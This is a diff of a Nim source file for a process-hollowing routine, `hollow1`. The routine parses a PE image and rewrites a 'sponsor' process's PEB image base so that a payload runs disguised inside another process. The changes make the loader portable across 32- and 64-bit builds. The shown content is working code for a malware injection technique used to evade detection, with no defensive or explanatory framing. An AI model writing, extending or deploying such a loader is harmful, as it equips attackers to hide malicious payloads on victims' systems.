@@ -1,6 +1,6 @@
 import winim
 import ptr_math
-import std/strutils
+import strutils
 
 
 proc hollow1*(peStr: string, processInfoAddress: PPROCESS_INFORMATION): bool =
@@ -9,7 +9,7 @@ proc hollow1*(peStr: string, processInfoAddress: PPROCESS_INFORMATION): bool =
     var peBytes = @(peStr.toOpenArrayByte(0, peStr.high))
     var peBytesPtr = addr peBytes[0]
     var peImageDosHeader = cast[ptr IMAGE_DOS_HEADER](peBytesPtr)
-    var peImageNtHeaders = cast[ptr IMAGE_NT_HEADERS64]((cast[ptr BYTE](peBytesPtr) + peImageDosHeader.e_lfanew))
+    var peImageNtHeaders = cast[ptr IMAGE_NT_HEADERS]((cast[ptr BYTE](peBytesPtr) + peImageDosHeader.e_lfanew))
     var peImageSectionsHeader = cast[ptr IMAGE_SECTION_HEADER](cast[size_t](peImageNtHeaders) + sizeof(IMAGE_NT_HEADERS))
     var peImageSizeOfHeaders = cast[size_t](peImageNtHeaders.OptionalHeader.SizeOfHeaders)
     var peImageSize = cast[size_t](peImageNtHeaders.OptionalHeader.SizeOfImage)
@@ -88,7 +88,7 @@ proc hollow1*(peStr: string, processInfoAddress: PPROCESS_INFORMATION): bool =
         sponsorProcessHandle,
         cast[LPVOID](cast[int](sponsorPeb) + 0x10),
         addr newImageBaseAddress,
-        8,
+        cast[size_t](sizeof(PVOID)),
         NULL
     ) != TRUE:
         when not defined(release): echo "[-] Could not write to sponsor process"
